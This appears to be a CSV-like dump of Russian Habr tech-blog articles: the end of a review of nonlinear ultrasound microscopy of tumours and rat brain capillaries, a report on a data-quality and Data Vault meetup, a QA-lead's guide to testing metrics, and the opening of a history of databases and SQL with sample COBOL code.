Интересно, что количественная оценка объемов опухолей in vivo была бы невозможна на основе только анатомической ультразвуковой визуализации, что подчеркивает потенциал этого метода визуализации.   Изображение №4  Наряду с генетически кодируемыми GV, синтетические липидно-оболочечные MB являются еще одним классом ультразвуковых контрастных агентов, используемых в качестве сосудистых репортеров. MB демонстрируют амплитудно-зависимое ультразвуковое рассеяние, что делает их также обнаруживаемыми с помощью последовательностей импульсов амплитудной модуляции. Чтобы проверить способность NSSM визуализировать MB, циркулирующие в кровеносных сосудах, ученые провели высокоскоростную нелинейную допплеровскую визуализацию сосудистой системы мозга крысы (снимки выше).  MB, настроенные на высокочастотный ультразвук, вводились посредством инъекций в хвостовую вену анестезированным крысам с фиксированной головой (4A). В качестве справочного материала линейные допплеровские изображения SSM были получены с частотой кадров 4.4 кГц (4B) и дали результаты, аналогичные сверхбыстрым допплеровским изображениям мозга крысы. Допплеровские изображения NSSM (4C) были получены с использованием амплитудно-модулированных данных и фильтра верхних частот для удаления остаточных статических эхо-сигналов.  Поскольку нелинейная допплеровская обработка пространственно ограничивает данные изображения тонкой звуковой плоскостью размером 100 мкм x 9.6 мм x 8.8 мм, было обнаружено меньше сосудов на 4C, чем на 4B, который проецирует на одно изображение эхо-сигналы, возникающие из косых путей каждой плоской волны (1C). В результате кортикальная поверхность была четко очерчена в допплеровском NSSM (4C), тогда как сосудистые сигналы, проецируемые из косых путей каждой плоской волны, видны над корой на 4B.  Затем ученые провели ультразвуковое секционирование сосудов мозга крысы с субволновыми шагами сканирования 55 мкм (4D), получив четыре последовательных допплеровских сбора данных на плоскость. Была проведена количественная оценка сосудистых изменений в этих смежных плоскостях путем вычисления значения матрицы индекса структурного сходства для каждого допплеровского сбора данных (4E). Внутри наборов индекс структурного сходства в среднем составил 0.99. Это указывает на то, что сосудистые изображения были почти идентичными на протяжении сердечных циклов. Между наборами индекс снизился до 0.96. Это подтвердило, что наблюдались две отдельные сосудистые плоскости.  Вдохновленные методами многослойной томографии, ученые проверили способность допплеровской NSSM захватывать несколько видов мозга одновременно. Для этого ученые чередовали передачу импульсной последовательности с использованием двух субапертур элементов массива (4F). В этой конфигурации частота визуализации была установлена на 1.7 кГц в обеих плоскостях звукового листа. Чтобы продемонстрировать универсальность этого подхода, была проведена визуализация двух коронарных сосудистых плоскостей, разделенных на 3.3 мм, с помощью первой решетки RCA-преобразователя (4G). Аналогичным образом были визуализированы две сагиттальные сосудистые плоскости, разделенные на 3.3 мм, с помощью второй решетки RCA-преобразователя, в результате чего были обнаружены симметричные сосудистые плоскости в каждом полушарии (4H). Наконец, допплеровские спектрограммы SSM в каждой сагиттальной плоскости были обработаны, чтобы показать, что получение данных было непрерывным и совпадало во времени (4I-4J). Частота сердечных сокращений, полученная с помощью допплерографии, составила 298 и 295 ударов в минуту в каждом полушарии мозга соответственно.  В 2015 году ультразвуковое исследование сосудов было переопределено введением ультразвуковой локализационной микроскопии (ULM от ultrasound localization microscopy), метода сверхвысокого разрешения, который может отображать микрососуды in vivo с разрешением ~λ/8. Недостатком текущей обработки ULM является то, что фильтры на основе SVD, используемые для выделения эхосигналов MB, не способны обнаруживать самые медленные скорости кровотока, происходящие в капиллярных руслах. Как следствие, ULM пока не может визуализировать капилляры, хотя это самая обширная сосудистая территория живых организмов. Поскольку обнаружение MB с помощью NSSM основано на нелинейном рассеянии MB, а не на движении MB, ученые выдвинули гипотезу, что сочетание NSSM и ULM может потенциально выявить капиллярные русла in vivo.   Изображение №5  Ученые исследовали нелинейную локализационную микроскопию звукового листа (NSSLM от nonlinear sound-sheet localization microscopy) церебральной капиллярной сосудистой системы (снимки выше). Краниотомированные мозги крыс, перфузируемые MB, визуализировались на частоте 1 кГц с использованием NSSM в коронарной средней мозговой плоскости в течение 105 секунд, что привело к получению 105 кадров (5A). Для генерации современных изображений ULM и изображений NSSLM использовались два конвейера постобработки. Вкратце, обработка NSSLM состояла в фильтрации эхо-сигналов MB с шагом амплитудной модуляции в NSSM, за которой следовала фильтрация по скорости для изоляции MB в нескольких скоростных диапазонах [0-3], [3-15], [15-150] мм/с. Положение отдельных эхо-сигналов MB оценивалось с помощью алгоритма радиальной симметрии, а траектории реконструировались с помощью спаривания Куна-Мункреса. На 5B показаны изображения доплера SSM и NSSM, отфильтрованные в диапазоне скорости капиллярного потока (от 0.5 до 3 мм/с), показывающие, что NSSM извлекает сосудистые сигналы в корковых и гиппокампальных областях мозга крысы с хорошим SNR, тогда как изображения SSM в основном заполнены диффузным сосудистым шумом. В частности, низкие скорости, расположенные на стенке синусной вены, видны в допплеровском NSSM. Временные ряды кадров NSSM, отфильтрованных в диапазоне скорости капиллярного потока (5C), показывают динамику медленно текущих MB, захваченных с помощью NSSM, что составляет основу для постобработки NSSLM. Отдельные микропузырьки, которые являются квазистатичными, обозначены белыми стрелками. В течение 75 мс несколько MB продвигаются менее чем на половину длины волны (57 мкм). Это указывает на то, что их скорость ниже 0.8 мм/с, что попадает в диапазон скоростей капиллярного потока.  В качестве справочного материала ученые обработали современную карту плотности ULM с использованием передачи TX1 последовательности NSSM (5D). Для сравнения, NSSLM (5E-5F) позволил картировать капиллярные русла, сегментированные с полосой скорости потока 0-3 мм/с (левая панель на 5E), артериолы и венулы, сегментированные с полосой скорости потока 3-15 мм/с (средняя панель на 5E) и артерии и вены, сегментированные с полосой скорости потока 15-150 мм/с (правая панель на 5E). Составное изображение NSSLM, показывающее все сосудистые отсеки, представлено на 5F. Сосудистые структуры, отображенные на изображении NSSLM, выглядят явно плотнее структур, обнаруженных с помощью SSLM, как и ожидалось от капиллярных русел.  Для более детального ознакомления с нюансами исследования рекомендую заглянуть в доклад ученых и дополнительные материалы к нему.  Эпилог В рассмотренном нами сегодня труде ученые продемонстрировали новый метод визуализации сосудов, объединяющий в себе микроскопию и ультразвуковое исследование.  Одним из наиболее распространенных методов диагностики является УЗИ (ультразвуковое исследование), однако он обладает рядом ограничений. В частности, мелкие структуры (например, клетки или даже сосудистые капилляры) не поддаются такой визуализации.  Разработанная учеными система использует звукоотращающий зонд, который представляет собой заполненную газом наноразмерную везикулу (микропузырьки), которая светится на ультразвуковых снимках, делая клетки видимыми. Эти везикулы имеют белковую оболочку, а потому ученые могут спроектировать их так, чтобы они настраивали свою яркость на снимках. Данные микропузырьки использовались для визуализации раковых клеток. Дополнительно микропузырьки использовались для визуализации капиллярной сосудистой структуры мозга крысы, что позволило получить детальную карту капилляров.  Ученые считают, что их разработка может быть полезна не только в рамках клинической диагностики, но и в исследованиях рака. Данная технология позволяет отличить здоровую ткань от раковой, визуализировать некротическое ядро — центр опухоли, где клетки начинают умирать из-за недостатка кислорода. Следовательно, данный метод может быть полезен в отслеживании прогрессирования рака и динамики реакции на препараты.  Немного рекламы Спасибо, что остаётесь с нами. Вам нравятся наши статьи? Хотите видеть больше интересных материалов? Поддержите нас, оформив заказ или порекомендовав знакомым, облачные VPS для разработчиков от $4.99, уникальный аналог entry-level серверов, который был придуман нами для Вас: Вся правда о VPS (KVM) E5-2697 v3 (6 Cores) 10GB DDR4 480GB SSD 1Gbps от $19 или как правильно делить сервер? (доступны варианты с RAID1 и RAID10, до 24 ядер и до 40GB DDR4).  Dell R730xd в 2 раза дешевле в дата-центре Maincubes Tier IV в Амстердаме? Только у нас 2 х Intel TetraDeca-Core Xeon 2x E5-2697v3 2.6GHz 14C 64GB DDR4 4x960GB SSD 1Gbps 100 ТВ от $199 в Нидерландах! Dell R420 — 2x E5-2430 2.2Ghz 6C 128GB DDR3 2x960GB SSD 1Gbps 100TB — от $99! Читайте о том Как построить инфраструктуру корп. класса c применением серверов Dell R730xd Е5-2650 v4 стоимостью 9000 евро за копейки?"
3,Итоги митапа RSHB DA Meetup: Качество данных и Data Vault 2.0 в действии,РСХБ.цифра (Россельхозбанк),Меняем банк и сельское хозяйство,0,"Веб-разработка, Программное обеспечение, Веб-сервисы",2025-04-11,"27 февраля в офисе РСХБ-Интех в Москве состоялся митап для дата-аналитиков и инженеров данных RSHB DA Meetup: Качество данных и Data Vault 2.0 в действии. Мероприятие было организовано при поддержке нашего постоянного партнера — JUG Ru Group. Ведущей стала Ольга Ведерникова, основатель и CEO Эпсилон Метрикс — no-code платформы для создания AI-агентов, AI-приложений и конвейеров данных. На митап пришли 60 человек, 146 присоединились к трансляции в онлайне. Митап заинтересовал тех, кто занимается большими данными и следит за их качеством.Программа митапа включала три доклада от экспертов.Первым выступал Леонид Калядин, Data Lead МТS Digital, с докладом «Data Quality в условиях Self-Service: как мы избежали хаоса и создали систему проверок для коммунальных витрин». Леонид — эксперт в проектировании и разработке эффективных решений в области работы с данными, он специализируется на создании понятных и простых в использовании дата-продуктов, которые помогают принимать обоснованные бизнес-решения.В Self-Service отчетности может сильно вырасти количество запросов на проверку данных коммунальных витрин. Леонид рассказал, как разработали фреймворк для управления качеством данных и процессов в этих условиях.Руководитель отдела развития витрин данных «РСХБ-Интех» Алексей Кошевой и Управляющий директор управления бизнес-анализа данных «РСХБ-Интех» Кристина Проскурина поделились историей создания одной песочницы на Greenplum из 10 разных. Решение множества проблем и устранение багов — на техническом уровне, в бизнес-потребностях и безопасности. Алексей Кошевой сфокусирован на архитектуре данных в хранилище, качестве, консистентности предоставляемых данных и простоте их анализа. Кристина Проскурина в РСХБ руководит управлением по бизнес-анализу данных и проектами в части Корпоративного хранилища данных и Data Research.В докладе Кристина и Алексей рассказали о результатах по итогам проекта: сейчас каждое бизнес-подразделение может удобно пользоваться данными, которые раньше приходилось запрашивать у коллег в виде файлов или загружать из исходных систем. Добавление новых объектов из системных источников происходит практически по письму. Бизнес сам может открывать доступ к этим данным. Это единственная система, которую нужно сопровождать и развивать. Закрыл сессию с докладами руководитель направления архитектуры данных Ecom.tech  Денис Лукьянов (Ecom.tech). Денис успешно реализовывает проекты миграции DWH с различных стеков на Greenplum по методологии Data Vault. Архитектура DV 2.0 на Greenplum для построения DWH сегодня популярна, но из-за неправильного применения размер логической модели может быть неоправданно большим. Спикер объяснил, как «сдуть» классическую модель DV до понятного конструктора витрин — для витрин дата-департамента и Self-Service на примере «продовой» версии DV Ecom.tech.Авторы самых интересных вопросов офлайн и онлайн-участников были получали призы и фирменный мерч от РСХБ-Интех. Финалом митапа стал фуршет, на котором участники и спикеры продолжили неформальное общение и дискуссию.Смотрите короткий видеоролик о митапе.Все материалы митапа уже есть в открытом доступе. Презентации докладчиков можно скачать здесь, фотографии с митапа — в VK. Если по каким-либо причинам вам неудобно смотреть записи докладов на Rutube, они дополнительно выгружены на ВК Видео.Анонсы будущих митапов ищите в нашем Telegram-канале, группе в ВК, а также в чате Митапы РСХБ.цифра в Telegram."
4,"А вы знаете, что происходит у вас в проекте?",Сбер,"Технологии, меняющие мир",0,"Программное обеспечение, Мобильные технологии, Веб-сервисы",2025-04-11,"В воспитании детей есть интересный каламбур: если вы в любой момент времени не знаете, чем заняты ваши дети, то, возможно, это уже не ваши дети. Перефразируя под процессы обеспечения качества в проекте, можно сказать: если вы не знаете, чем занимаются ваши QA‑инженеры, и не внедрили метрики в проекте, то, возможно, это уже не ваш проект?Меня зовут Илья я лид тестирования в проекте Сбер Диск. Про управление командой тестирования поговорим как‑нибудь в другой раз. А сейчас мне хотелось бы обсудить именно метрики тестирования. Метрики. Кого‑то они пугают, кто‑то их ненавидит, кто‑то молится на них. Признаюсь, когда я только начинал заниматься тестированием, они меня дико раздражали. «Да зачем они вообще нужны?» — думал я. — «Давайте просто работать. Писать тест‑кейсы, потом их автоматизировать». Нужны метрики? Ну вот, я вручную проверял неавтоматизированные кейсы и запустил автотесты. Вот аллюр отчёт по ним. Разве это не метрики?Позже я приобрёл опыт и понял, что метрики — это не враг, а лучший друг как рядового инженера, так и руководителя. Без метрик сегодня невозможно нормальное функционирование и развитие любого проекта.Нельзя прийти к своему руководителю и на вопрос: «Что там с проектом?» ответить: «Всё отлично, проект качественный, зуб даю!» Невозможно повысить зарплату, обосновывая, что тестировщик Ваня — отличный парень и чётко работает, а наш проект — лучший по обеспечению качества, потому что я в этом уверен!Что такое метрики в тестировании?Метрики в тестировании — это количественные показатели, используемые для оценки качества продукта, эффективности процессов тестирования и работы команды. Они помогают принимать обоснованные решения на основе объективных данных.В целом, я согласен с этим определением. Особенно хочу подчеркнуть одну важную мысль:«Они помогают принимать обоснованные решения на основе объективных данных.»Именно возможность принять обоснованное решение — главная ценность метрик. А объективность данных — ключевой критерий.Не все метрики соответствуют этому критерию объективности. Давайте рассмотрим и попробуем классифицировать их. Для начала разделим метрики на три группы и обсудим каждую из них подробнее.Я выделяю три группы:Метрики покрытия измеряют степень охвата различными видами тестирования или автоматизации разных областей продукта.Метрики скорости оценивают, насколько быстро протекают различные процессы тестирования.Метрики качества показывают количество дефектов в продукте, их критичность, места концентрации и динамику появления новых багов.Метрики покрытияВ этой категории я выделяю две ключевые метрики: покрытие требований тестовыми сценариями и покрытие тестовых сценариев автотестами. Как ни странно, эти два показателя являются полными противоположностями друг другу. Покрытие требований — это та метрика, которую стоит внедрять одной из первых на проекте. А вот покрытие автотестами внедряют только после запуска автоматизированного тестирования, что нередко занимает значительное время. Интересно, что покрытие автотестами является одной из самых простых для внедрения метрик, тогда как покрытие требований — одна из наиболее сложных.По своему опыту скажу: если у вас есть аналитики, не стесняйтесь общаться с ними относительно полноты и структуры требований. Для этого например подойдет метод «Три амиго». Кратко напомню про него.«Три амиго» — это техника группового обсуждения, которая помогает участникам глубже разобраться в сложной теме или проблеме. На встрече должны присутствовать представители бизнеса, разработки и тестирования. Такая команда может удовлетворить запросы каждой из заинтересованных сторон и наиболее полно обсудить требования.Если же аналитиков нет и требования приходится писать самостоятельно, то заранее продумайте архитектуру и взаимосвязи внутри неё. Успех внедрения метрик напрямую зависит от того, удастся ли правильно структурировать требования и привязать к ним тестовые сценарии.Теперь перейдём к самим метрикам.Покрытие требованийЭта метрика демонстрирует, какая доля установленных требований была охвачена тестовыми сценариями. Чем выше этот показатель, тем больше уверенности в том, что мы не пропустили важные функции без тестирования.Формула расчётаФормула покрытия требований (Requirement Coverage Ratio — RCR), используемая для оценки полноты тестирования программного продукта, выглядит следующим образом:Зачем нужна эта метрика?Выявление пробелов в тестировании. Метрика помогает определить, какие требования остались без тестов. Это важно для предотвращения ошибок и сбоев в работе продукта.Планирование ресурсов. Позволяет планировать усилия команды на создание дополнительных тестовых сценариев и эффективно распределять ресурсы.Повышение качества продукта. Высокое покрытие требований повышает надёжность и стабильность системы. Важно убедиться, что тестовые сценарии охватывают именно основную логику, указанную в требованиях.Документация и отчётность. Предоставляет объективные данные для отчётности перед руководством и заказчиками о состоянии тестирования. Стоит помнить, что достичь полного покрытия сразу бывает сложно, поэтому важно заранее согласовывать цели и этапы достижения необходимого уровня покрытия. Затем регулярно предоставлять отчёты о прохождении этих этапов и динамике развития проекта.Покрытие тестовых сценариев автотестамиМетрика покрытия тестовых сценариев автотестами используется для оценки того, какая доля имеющихся сценариев была автоматизирована. Это важный параметр в тестировании, который помогает понять, насколько эффективно используются инструменты автоматизации и сколько времени можно сэкономить благодаря этому процессу.Чтобы более полно раскрыть потенциал этой метрики, можно зафиксировать, сколько времени команда тратит на прохождение регресса руками. Ну, или, в среднем, сколько времени занимает прохождение одного тестового сценария. А потом сравнить с длительностью автоматизированного прогона.И важно понимать и донести до руководства, что в этой метрике полное покрытие — не самоцель, и чем больше покрытие, тем больше времени придётся тратить на разбор результатов прогонов. Есть сценарии, которые очень сложно автоматизировать или поддерживать. Например, случаи со сложными интеграциями или многосоставными предусловиями. Команда может быть не готова к высокому техническому уровню. Важно помнить, что автоматизация должна помогать бороться с рутиной и освобождать время для более важных инженерных задач, а не создавать новые технологические проблемы.Формула покрытия тестовых сценариев: где: — Test Scenario Automation Rate (доля автоматизации); — количество тестовых сценариев, покрытых автотестами; — общее количество имеющихся тестовых сценариев.Зачем нужна эта метрика?Оптимизация процесса тестирования. Автотесты позволяют ускорить выполнение регресса и интеграционных тестов, особенно когда изменения вносятся часто. Чем больше доля покрытия, тем быстрее можно провести полный цикл тестирования.Экономия времени и ресурсов. Автоматизация снижает нагрузку на команду тестирования, позволяя им сосредоточиться на более творческих и важных задачах, таких как исследование новой функциональности или разработка новых тестовых сценариев.Повышение надёжности. Автоматизированные тесты менее подвержены человеческим ошибкам, таким как пропуск шага или неправильная интерпретация результата.Мониторинг прогресса. Метрика помогает отслеживать прогресс в автоматизации тестирования и выявлять проблемные зоны, где автоматизация отстаёт. И самое важное: эта метрика выводит ваш отдел тестирования в одну лигу с разработчиками. Метрики скоростиДлительность нахождения задачи в тестированииЭта метрика относится к ключевым показателям эффективности процесса тестирования. Она определяет, сколько времени задача проводит в статусе «Тестирование», начиная с момента передачи её команде тестировщиков и заканчивая моментом завершения прогонов. Этот показатель помогает оценить производительность команды, выявить узкие места в процессе и оптимизировать работу над проектом, например внедрив автоматизацию.При внедрении этой метрики важно следить за тем, чтобы, с одной стороны, команда не забывала обновлять статусы задач в трекере, а с другой — избегать попыток манипуляции статистикой ради улучшения собственных показателей.Зачем нужна эта метрика?Производительность команды. Долгое пребывание задачи в тестировании может свидетельствовать о низкой производительности команды или проблемах с качеством передаваемого кода. Причинами могут быть незрелые процессы, отсутствие сильной координации среди команд или недостаток квалифицированных специалистов. Эта метрика помогает выявить проблемные участки и начать искать корень проблемы.Узкие места. Задержки в тестировании могут указывать на проблемы самого процесса, например, нехватку ресурсов, низкий уровень подготовки тестировщиков или недостаточную зрелость тестового фреймворка.Ожидания заказчика. Чем дольше задача находится в тестировании, тем дольше клиент ждёт готового продукта. Это сказывается на общем впечатлении от сотрудничества и может повлиять на лояльность клиента.Время прохождения регрессаЭта метрика отражает период, в течение которого проводится регрессионное тестирование после внесения изменений в программное обеспечение. Она помогает оценить продолжительность этого процесса и найти пути для его оптимизации. Чтобы собирать данные по этой метрике, обычно не требуется сложных настроек — в системах управления задачами вроде Jira или TestOps предусмотрен механизм отслеживания начала и окончания регрессионного тестирования. Результаты можно автоматически выводить в дашборды.Зачем нужна эта метрика?Эффективность тестирования. Длительность регресса напрямую связана с производительностью команды тестирования. Чем быстрее, тем скорее новый релиз выходит.Ресурсоёмкость. Длительный регресс требует значительных человеческих и технических ресурсов, что увеличивает общие затраты на проект.Клиентский опыт. Задержки с проведением регресса откладывают выпуск обновлений, что негативно отражается на восприятии продукта заказчиком.Кажется, что эта метрика подходит не для всех проектов. Например, если релизный цикл строго регламентирован (скажем, раз в месяц или квартал), то внедрение этой метрики может показаться избыточным. Но даже небольшая экономия времени может открыть окно возможностей для дальнейшего развития проекта и ускорения релизного цикла. А в условиях коротких циклов и небольших релизов («маленькие задачи — маленькие релизы») она становится одной из ключевых. Её удобно использовать как ориентир для совершенствования работы команды. Например, в одном из моих проектов регресс занимал три дня и проводился вручную. Благодаря автоматизации и улучшению процессов тестирования его сократили до 40 минут и сделали практически полностью автоматизированным. Это позволило нам выпускать релизы в любое удобное время, как только готовы новые фичи от разработчиков.Метрики качестваМетрики качества помогают оценить качество продукта, выявить слабые места и определить направления для дальнейшего улучшения. Эти метрики проще всего внедрить в процессы. Для работы с ними нужно присвоить багам веса, настроить фильтр для сбора данных и дашборд для их отображения. Рекомендую внедрить эти метрики как можно быстрее, чтобы с самого начала мониторить качество продукта и выводить статистику по изменению качества.Количество багов в продукте и их приоритетЭта метрика показывает общее количество зарегистрированных багов в продукте, а также их значимость (приоритет). Приоритет бага обычно определяется его влиянием на функциональность продукта, безопасность или удобство пользователей.Зачем нужна эта метрика?Позволяет понять масштаб проблемы. Если количество багов велико, это может свидетельствовать о низком качестве продукта или недостаточном уровне тестирования.Приоритет багов помогает расставить приоритеты. Более приоритетные баги, способные серьёзно повлиять на работу продукта, требуют немедленного внимания и исправления.Динамика по багамЭта метрика отслеживает изменения количества багов во времени. Обычно строится график, отображающийколичество открытых и закрытых багов за определённый период (неделю, месяц, спринт и т. д.).Зачем нужна эта метрика?Помогает увидеть тенденции. Растёт ли количество багов и их вес или уменьшается со временем.Показывает эффективность работы команды. Снижение количества открытых багов может говорить о хорошем прогрессе в исправлении ошибок.Указывает на потенциальные проблемы. Резкий рост количества багов может сигнализировать о снижении качества кода или увеличении сложности продукта.Количество инцидентов в проде и их приоритетЭта метрика учитывает количество реальных багов, возникших в проде. Она очень важна для понимания, насколько ваша система тестирования справляется с поставленными перед ней задачами.Зачем нужна эта метрика?Отражает фактическое воздействие на пользователей. Даже если при тестировании выявлено много багов, главное — минимизировать инциденты в проде.Помогает оценить надёжность продукта. Чем меньше инцидентов, тем более надёжным воспринимается пользователями продукт.Плотность дефектов по стендамПлотность дефектов по стендам — это метрика, позволяющая оценить количество дефектов, приходящихся на определённые тестовые окружения (стенды). Она помогает выявить, на каком этапе жизненного цикла программного обеспечения (разработка, тестирование, эксплуатация) возникает больше всего проблем, и какие окружения больше всего подвержены ошибкам.Зачем нужна эта метрика?Идентификация проблемных зон. Помогает понять, в каких окружениях чаще всего проявляются дефекты.Оптимизация процессов. Высокая плотность дефектов на определённом стенде может сигнализировать о необходимости пересмотреть процессы развёртывания или тестирования.Приоритизация исправлений. Сосредотачиваемся на тех стендах, где замечено больше всего багов.Анализ качества релиза. Позволяет оценить готовность продукта перед выпуском в эксплуатацию.ЗаключениеЯ постарался максимально сжато охватить ключевые метрики, которые вы можете и должны внедрить в проекте. Приведённый в статье джентльменский набор метрик позволит быстро и качественно настроить мониторинги состояний процессов тестирования. Конечно в каждом проекте есть свои особенности, на которые следует обращать внимание, и что‑то добавлять или убирать. Но главное, всегда нужно помнить и разъяснять другим, зачем нужны метрики. Что они не враг, а самый лучший друг любого инженера, и без них выстроить прозрачные, удобные, а главное, масштабируемые процессы никогда не получиться.В своих продуктах я обязательно внедряю все перечисленные метрики. Да, общий экран мониторинга похож на кабину космического корабля, с множеством графиков, таблиц и диаграмм. Но так как всё это внедряется постепенно, то быстро к ним привыкаешь и уже чувствуешь без них себя как без рук. Примерно так я себя ощущаю на рабочем местеЧто ещё очень важно: все эти мониторинги должны быть доступны как для всей команды тестирования, так и для всех желающих погрузиться в процессы тестирования в проекте. И если менеджеры не часто заглядывают в мониторинги, оставляя их на откуп мне, то для команды тестирования нужно обязательно проводить демо и прививать привычку к использованию этих систем. Все члены команды тестирования должны быть погружены в процессы, происходящие в проекте, и видеть общую картину. Открытость — это путь к построению качественных процессов.Спасибо за внимание! В комментариях с удовольствием почитаю, какие метрики вы используете в своих проектах. Уверен, у вас есть множество историй, как вы к ним пришли. "
5,Сиквел и приквел: занимательная археология,Postgres Professional,Разработчик СУБД Postgres Pro,0,"Программное обеспечение, Консалтинг и поддержка, Информационная безопасность",2025-04-11,"Предлагаю вашему вниманию немного дополненный доклад, который я делал на конференции PGConf.СПб 2024. В нем я рассказываю о том, как появились первые реляционные системы, как возник и всех победил язык SQL.Доисторические временаНачиная с изобретения абака, история развития вычислительной техники — это так или иначе история автоматизации вычислений. Даже само слово «вычислительная» говорит об этом (и в английском языке тоже: computer, calculator — вычислитель). Важная переломная точка приходится на XIX век. Типичной задачей того времени, требовавшей большого объема вычислений, был расчет различных таблиц (например, логарифмических или тригонометрических). Работа над устройствами, способными автоматически справляться с вычислениями, привела Чарльза Бэббиджа к его знаменитой ныне Аналитической машине. Другие современные ей устройства были спроектированы для решения какой-либо одной конкретной задачи, Аналитическая же машина была по задумке Бэббиджа программируема. Она состояла из блоков, присутствующих теперь в любой ЭВМ: арифметическое устройство, запоминающее устройство, управляющее устройство, периферия (ввод программы и данных с жаккаровских перфокарт и вывод результатов на печать). К сожалению, Аналитическая машина никогда не была построена, хотя это и неудивительно: за неимением лучшего в середине XIX века, Бэббидж спроектировал ее на механической элементной базе (то есть в прямом смысле на рычагах и шестеренках). Однако заложенные в машину принципы оказались настолько удачными, что они во многом определили дальнейшее развитие вычислительной техники. Говард Эйкен, создавший в 1943 году (при участии IBM — так уж получилось, что эта корпорация будет встречаться нам постоянно) первую реально работавшую программируемую машину Automatic Sequence Controlled Calculator (для краткости названную Mark I), признавался: «Живи Бэббидж на 75 лет позже, я остался бы безработным». Фактически Mark I повторял архитектуру Аналитической машины, но на более современной элементной базе (Эйкен использовал как механические элементы, как и электромеханические реле). Некоторое время после появления ЭВМ их продолжали использовать только для вычислительных задач (в основном с военной спецификой: расчет баллистических таблиц, вычисления для создания водородной бомбы, криптография). Но уже к концу 1940-х появилось понимание, что наряду с чисто математическими задачами, программируемый компьютер может решать и задачи бизнеса. Первыми ласточками стали великобританский EDSAC (1949) и построенная в начале 1950-х на его основе коммерческая система LEO (применялась для расчета зарплаты, складского учета, планирования производства — практически ERP), а также американский UNIVAC (1951), созданный для хранения, обработки и печати большого объема данных (в качестве внешней памяти использовалась магнитная лента емкостью порядка миллиона символов, лентопротяжное устройство обеспечивало скорость 12500 символов в минуту). Более широкому применению ЭВМ в бизнесе мешало отсутствие запоминающего устройства большой емкости с произвольным доступом: магнитная лента по своей сути последовательна, а магнитные барабаны имели небольшую емкость и использовались в основном как дополнительное «медленное» ОЗУ. Ситуация изменилась в 1956 году с изобретением IBM жестких магнитных дисков и появлением первого НЖМД IBM 350 Disk File (устройство имело емкость 5 миллионов символов и состояло из 50 дисков, вращающихся со скоростью 1200 оборотов в минуту).Появление запоминающих устройств прямого доступа стало причиной переворота в мышлении... Направления, обозначаемые словами в и из, поменялись на обратные. Если директива ввод в мире последовательного доступа к файлам означала с ленты в вычислительную машину, то новая директива ввод означает в базу данных.— Чарльз БахманПримерно в то же время (середина 1950-х) начали появляться и первые операционные системы, которые, среди прочего, унифицировали работу с внешними устройствами, введя понятие файла. В отличие от обычного современного понимания файла как потока байтов, в операционных системах мейнфреймов файл был структурирован и представлял собой набор записей фиксированного или переменного размера. Доступ к файлам мог быть как последовательный (запись за записью), так и индексированный (по части записи, объявленной ключом, можно перейти сразу к подходящим записям). В таком файле нетрудно разглядеть прообраз базы данных. Однако многими важными для информационных систем свойствами ОС все-таки не обладают. Взаимосвязанные данные сложной структуры нужно хранить в нескольких файлах, обеспечивая при этом их согласованность (пользователь БД не должен увидеть «промежуточной» ситуации, когда в одном файле информация уже изменилась, а в другом еще нет). Должна быть возможность одновременного доступа к данным многими пользователями (как для чтения, так и для изменения), а механизмы файловых систем для этого слишком грубы. Требуется надежное хранение информации с возможностью восстановления базы данных в согласованном состоянии после сбоя. Кроме того, нужны пользовательский и программный интерфейсы для выборки и изменения информации. Какое-то время все эти задачи — с тем или иным успехом — решали заново в каждом приложении, работающем с базой данных.Человеком, который первым понял, что СУБД имеет смысл как отдельная универсальная программа, стал Чарльз Бахман. Он работал в General Electric (а это была одна из крупнейших компаний, она производила и собственные компьютеры). Занимаясь системой управления производством, он выделил компонент управления данными — Integrated Data Store, IDS. Сначала IDS смогли воспользоваться для своих задач другие подразделения GE, им понравилось — это существенно экономило силы, — и в 1964 году IDS была выпущена как отдельный продукт.В 1973 году Бахман был удостоен премии Тьюринга. А это одна из главных премий в нашем мире, признание огромного вклада в развитие отрасли.Сетевая модельИз языков программирования высокого уровня в те времена были Фортран для математики (1954), академический Алгол и своеобразный Лисп (1958). На чем писать коммерческие задачи, было не очень понятно, и вот в 1959 году был образован комитет по языкам систем обработки данных CODASYL, который разработал язык COBOL (Common Business-Oriented Language).В 1965 году внутри этого комитета была создана группа DBTG (Data Base Task Group) для разработки языка для баз данных. В 1969 году эта группа, основываясь на идеях Бахмана (а Бахман сам и входил в эту группу), представила спецификацию сетевой модели данных CODASYL.Приведу простой классический пример: детали (PART) и поставщики (VENDOR). Они связаны отношением «многие ко многим» через дополнительную сущность «поставка» (SUPPLY). Диаграмма Бахмана выглядит вполне привычно, похоже на обычную ER-диаграмму (только ее в то время еще не изобрели):А вот упрощенный фрагмент программы на Коболе с описанием схемы такой базы данных (Хабр не умеет расцвечивать Кобол, это упущение): 01 PART.     02 PART_ID     PIC X(8).     02 PART_DESC   PIC X(50). 01 SUPPLY.     02 SUP_PRICE   PIC S9(6)V9(2). 01 VENDOR.     02 VEND_ID     PIC X(8).     02 VEND_NAME   PIC X(40). SET NAME PART_INFO     OWNER PART     MEMBER SUPPLY SET NAME VENDOR_SUPPLY     OWNER VENDOR     MEMBER SUPPLYУ детали есть идентификатор и описание, у поставщика — идентификатор и имя, атрибут поставки — срок. Тоже вполне привычно, не считая синтаксиса. Но на стоит обратить внимание: записи PART, VENDOR и SUPPLY не содержат ничего, что связывало бы их друг с другом. Это именно отдельные записи. А связи — это отдельная штука, которая называется SET — множество. У множества есть родительная запись (OWNER) и дочерние записи (MEMBER). Здесь два множества: PART_INFO (поставки данной детали) и VENDOR_SUPPLY (поставки данного поставщика).Бахман продвигал идею, что программист — это навигатор в мире данных. Так, кстати, называлась и его тьюринговская лекция.Сейчас мы посмотрим одну очень простую программу (на Коболе, конечно), и смысл этих слов сразу станет ясен. Попробуйте, кстати, догадаться, что делает этот код.FETCH-THE-PART.     MOVE 15 TO PART_ID.     FETCH FIRST PART USING PART_ID.         AT END GO TO ALL-DONE. FIND-SUPPLY.     FIND NEXT SUPPLY WITHIN PART_INFO.         AT END GO TO ALL-DONE.     FETCH OWNER WITHIN VENDOR_SUPPLY.     DISPLAY VEND_ID.      GO TO FIND-SUPPLY. ALL-DONE.Мы разберем программу на примере: пусть у нас два поставщика, три детали и три поставки. Ниже показаны записи и множества, существующие в базе данных (обозначения не я придумал — так было принято):Сначала программа получает запись типа PART с идентификатором 15 (FETCH FIRST PART), она будет нашей точкой входа в базу данных. Эта запись является родительской в множестве типа PART_INFO.Теперь мы находим следующую поставку в текущем множестве PART_INFO (FIND NEXT SUPPLY). Все дочерние записи множества связаны двунаправленными ссылками, так что между ними можно перемещаться, используя команды FIND FIRST, FIND NEXT или FIND LAST, FIND PRIOR.Дальше находим и выводим родительскую запись в текущем множестве типа VENDOR_SUPPLY (FETCH 